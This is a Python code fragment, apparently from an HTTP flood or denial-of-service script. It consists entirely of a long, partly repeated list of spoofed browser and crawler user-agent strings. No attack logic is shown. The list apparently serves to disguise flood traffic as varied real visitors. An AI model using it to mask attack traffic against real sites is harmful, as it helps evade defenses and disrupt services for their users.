	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
